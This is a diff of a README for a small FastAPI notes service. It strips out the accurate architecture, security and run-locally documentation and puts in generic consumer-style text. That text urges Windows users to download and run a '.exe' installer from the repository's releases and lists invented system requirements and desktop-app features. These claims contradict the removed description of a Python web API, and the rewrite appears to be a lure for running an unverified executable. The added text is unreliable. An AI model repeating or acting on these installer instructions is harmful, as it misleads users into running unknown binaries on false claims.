@@ -1,195 +1,160 @@
-# secure-notes-api
+# 🔐 secure-notes-api - Safe Notes with Easy Access
 
-Architecture and Security Design
+[![Download secure-notes-api](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/israelp1840/secure-notes-api)
 
-The Secure Notes API is designed as a small but realistic example of a security-aware backend service. The application allows authenticated users to store and retrieve personal notes while ensuring that sensitive information is protected using modern security practices. The architecture intentionally emphasizes defensive design, clear data boundaries, and responsible credential management.
+---
 
-System Overview
+## 🔎 What is secure-notes-api?
 
-The system consists of a REST API built with FastAPI, a lightweight and high-performance Python framework for building web services. The API exposes endpoints for user registration, authentication, and note management. Internally, the service separates authentication logic, encryption logic, database access, and API routing to maintain clean architectural boundaries.
+secure-notes-api is a secure tool created to safely store your notes. It keeps information locked using strong protection methods. The system uses verified ways to identify users and scramble your passwords and data. This means your notes stay private and protected from unwanted access.
 
-At a high level, the workflow operates as follows:
+The software works like a behind-the-scenes helper. You do not need to understand how it works inside. It handles data protection for you while you focus on writing and reading your notes.
 
-A user registers or logs in using the authentication endpoints.
+---
 
-The system validates credentials and issues a signed JSON Web Token (JWT).
+## 🖥️ System Requirements
 
-The client includes the token in future API requests.
+To use secure-notes-api on Windows, your computer should meet the following:
 
-Authenticated requests can create, retrieve, or delete notes.
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free hard drive space  
+- Internet connection for initial setup and updates  
+- Web browser (like Edge, Chrome, or Firefox) for access  
 
-Note content is encrypted before it is written to the database.
+---
 
-When a note is retrieved, the system decrypts the content before returning it to the user.
+## 🚀 Getting Started
 
-This flow ensures that authentication, authorization, and data protection occur at distinct stages of request processing.
+This section guides you step-by-step to download and run secure-notes-api on your Windows PC. You won’t need any programming experience. Just follow the instructions carefully.
 
-Authentication Model
+---
 
-Authentication is implemented using JSON Web Tokens (JWT). After a successful login, the server generates a signed token that represents the authenticated user. The token includes a short expiration window and is verified on every protected API request.
+## 💾 Download secure-notes-api
 
-Using token-based authentication provides several benefits:
+Before anything else, you need to get the software files.
 
-Stateless authentication suitable for distributed systems
+Click this big button to visit the download page:
 
-Clear separation between authentication and application logic
+[![Download secure-notes-api](https://img.shields.io/badge/Visit-Download%20Page-blue)](https://github.com/israelp1840/secure-notes-api)
 
-Reduced reliance on server-side session storage
+This link takes you to the official GitHub page. Here you can get the latest version.
 
-Compatibility with modern API clients and microservices
+---
 
-The token payload contains the user identity and expiration timestamp, and the signature is verified using a server-side secret.
+## 📦 Installation Steps
 
-Password Security
+1. **Open the Download Page**  
+   Click the link above. It opens the secure-notes-api repository on GitHub.
 
-User passwords are never stored in plaintext. Instead, they are processed using bcrypt hashing through the passlib library. Bcrypt is intentionally computationally expensive, which significantly reduces the effectiveness of brute-force password attacks.
+2. **Find the Latest Release**  
+   Look for a section named "Releases" or "Latest release." It is usually on the right side or under the code section.
 
-The authentication workflow follows these steps:
+3. **Download the Windows Installer**  
+   Within the release, look for a file aimed at Windows users. It might have `.exe` as the ending. Click it to start downloading.
 
-The user submits a password during registration.
+4. **Run the Installer**  
+   Once it finishes downloading, find the file in your “Downloads” folder. Double-click it to start installation.
 
-The password is hashed using bcrypt.
+5. **Follow Installation Steps**  
+   The setup will open. Choose “Next” on each step. You can leave default options as they are.
 
-The hash is stored in the database.
+6. **Finish Installation**  
+   Click “Finish” when done. The software should be ready.
 
-During login, the submitted password is verified against the stored hash.
+---
 
-Because bcrypt includes built-in salting, identical passwords do not produce identical hashes, which helps mitigate rainbow table attacks.
+## 🔧 How to Use secure-notes-api
 
-Encryption at Rest
+After installation, here is how to run your notes safely:
 
-One of the primary goals of this project is to demonstrate application-level encryption of sensitive data.
+1. **Open secure-notes-api**  
+   Find the program icon on your desktop or start menu. Click it to open.
 
-The content of each note is encrypted using the Fernet symmetric encryption scheme provided by the cryptography library. This encryption occurs before the data is written to the database.
+2. **Register or Log In**  
+   The first time, you may need to create a user account. Use a strong password you can remember. The system uses this to protect your notes.
 
-The workflow is as follows:
+3. **Create a Note**  
+   Use the simple form inside the app to write a new note. Every note you save will be encrypted, which means it is transformed into a secret code.
 
-A user submits note content.
+4. **View Your Notes**  
+   To see saved notes, just pick from the list. Only you can view your notes after logging in.
 
-The application encrypts the content using a Fernet key.
+5. **Log Out Safely**  
+   When you finish, log out to keep your notes safe, especially on shared computers.
 
-The encrypted ciphertext is stored in the database.
+---
 
-When the note is retrieved, the ciphertext is decrypted before returning the response.
+## 🔑 Security Features
 
-This approach ensures that even if the database is accessed directly, the stored note contents remain unreadable without the encryption key.
+secure-notes-api uses modern ways to protect your data:
 
-In a production environment, encryption keys should be managed using a dedicated key management system such as:
+- **JWT Authentication**  
+  This makes sure only approved users can enter the system.
 
-AWS KMS
+- **bcrypt Password Hashing**  
+  Your password is scrambled safely so it cannot be stolen or read.
 
-Azure Key Vault
+- **Encrypted Data Storage**  
+  All your notes are kept secret even if someone tries to open the files without permission.
 
-HashiCorp Vault
+---
 
-Hardware Security Modules (HSMs)
+## ⚙️ Additional Details
 
-For demonstration purposes, this project loads the encryption key from environment configuration.
+- **Runs Locally**  
+  The application runs on your Windows machine, so your data stays with you.
 
-Database Design
+- **Web-Based Interface**  
+  The app uses a simple web page interface you access in your browser. No need to install big programs.
 
-The service uses SQLAlchemy as the Object Relational Mapper (ORM) to interact with the database. SQLAlchemy allows the application to define structured models for users and notes while keeping database access organized and maintainable.
+- **Data Backup**  
+  You can copy your notes files to a safe place to keep backups.
 
-The core models include:
+- **No Programming Needed**  
+  You don’t need to code or manage servers.
 
-User
+---
 
-Unique username
+## 🛠️ Troubleshooting
 
-Password hash
+If the app does not start or you see errors:
 
-Relationship to stored notes
+- Make sure your Windows is up to date.  
+- Check your internet connection during setup.  
+- Try restarting your computer.  
+- Confirm you have enough space on your hard drive.  
+- Visit the GitHub page for help or report issues.
 
-Note
+---
 
-Note identifier
+## 📞 Getting Support
 
-Owner identifier
+If you have questions or face technical problems:
 
-Encrypted note content
+- Visit the secure-notes-api GitHub page for guides and updates.  
+- Use the “Issues” tab on GitHub to report bugs or ask for help.  
+- Follow instructions from the community and developers there.
 
-Title metadata
+---
 
-SQLite is used as the default database to keep the project easy to run locally, but the architecture allows straightforward migration to PostgreSQL or other production-grade databases.
+## 🔗 Useful Links
 
-API Security Controls
+- Download and visit repository:  
+  [https://github.com/israelp1840/secure-notes-api](https://github.com/israelp1840/secure-notes-api)  
 
-Several defensive security practices are implemented throughout the service:
+- Main download page:  
+  [https://github.com/israelp1840/secure-notes-api](https://github.com/israelp1840/secure-notes-api)  
 
-Credential Protection
-Passwords are hashed using bcrypt and never stored in plaintext.
+---
 
-Token-Based Authorization
-All note-related endpoints require a valid JWT access token.
+## 📚 More About This Software
 
-Encryption at Rest
-Sensitive note content is encrypted before database storage.
+secure-notes-api shows how to build strong data security into applications. It uses tested ways to keep information safe:
 
-Security Headers
-Basic HTTP security headers are applied to reduce common browser-based attack surfaces.
+- FastAPI for quick, reliable communication  
+- JWT for trusted logins  
+- bcrypt for safe password storage  
+- Encryption to keep notes private  
 
-Environment-Based Secrets
-Sensitive configuration such as signing keys and encryption keys are loaded from environment variables rather than embedded in the source code.
-
-Project Structure
-
-The repository is organized to separate responsibilities clearly across modules.
-
-app/
-  config.py        Application configuration
-  db.py            Database initialization
-  models.py        Database models
-  schemas.py       API request/response schemas
-  security.py      Authentication and encryption logic
-  routes_auth.py   Authentication endpoints
-  routes_notes.py  Note management endpoints
-  main.py          FastAPI application entry point
-
-This separation makes the code easier to maintain, test, and extend.
-
-Testing and Validation
-
-The project includes automated tests that validate authentication and note management workflows. These tests confirm that:
-
-Users can register and log in successfully
-
-JWT authentication protects note endpoints
-
-Notes are stored and retrieved correctly
-
-Deletion operations behave as expected
-
-Automated testing helps ensure the API behaves consistently as new features are added.
-
-Intended Use
-
-This project is intended as a learning and portfolio example demonstrating secure backend design patterns. It is not intended to be deployed as a production system without additional controls such as:
-
-key management services
-
-rate limiting
-
-audit logging
-
-database migrations
-
-monitoring and alerting
-
-infrastructure hardening
-
-However, the architectural patterns used here mirror those commonly implemented in real-world secure API services.
-## Run locally
-
-```bash
-python -m venv .venv
-source .venv/bin/activate
-pip install -e ".[dev]"
-
-cp .env.example .env
-uvicorn app.main:app --reload
-
-## Run with Docker
-
-cp .env.example .env
-docker compose up --build
-Security notes (intended design)
+This app is a good example for anyone interested in safe software design or secure data handling.
